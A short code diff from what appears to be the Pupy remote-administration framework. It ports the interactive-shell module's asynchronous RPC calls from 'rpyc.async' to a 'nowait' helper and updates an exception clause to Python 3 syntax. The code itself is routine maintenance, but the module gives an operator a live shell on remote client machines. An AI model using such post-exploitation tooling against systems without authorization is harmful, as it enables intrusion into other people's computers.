@@ -2,7 +2,7 @@
 
 import sys
 import os
-import rpyc
+from network.lib.rpc import nowait
 from argparse import REMAINDER
 
 from pupylib.PupyModule import (
@@ -88,9 +88,9 @@ class InteractiveShell(PupyModule):
         if new:
             self.client.conn.register_remote_cleanup(release_shell)
 
-        remote_write = rpyc.async(ps.write)
+        remote_write = nowait(ps.write)
 
-        self.iogroup.set_on_winch(rpyc.async(ps.set_pty_size))
+        self.iogroup.set_on_winch(nowait(ps.set_pty_size))
         self.iogroup.set_mapping('~~~.', local_close)
         self.iogroup.set_mapping('~~~,', local_detach)
 
@@ -107,7 +107,7 @@ class InteractiveShell(PupyModule):
 
         try:
             ps.detach()
-        except Exception, e:
+        except Exception as e:
             detached[0] = False
             self.error(e)
 
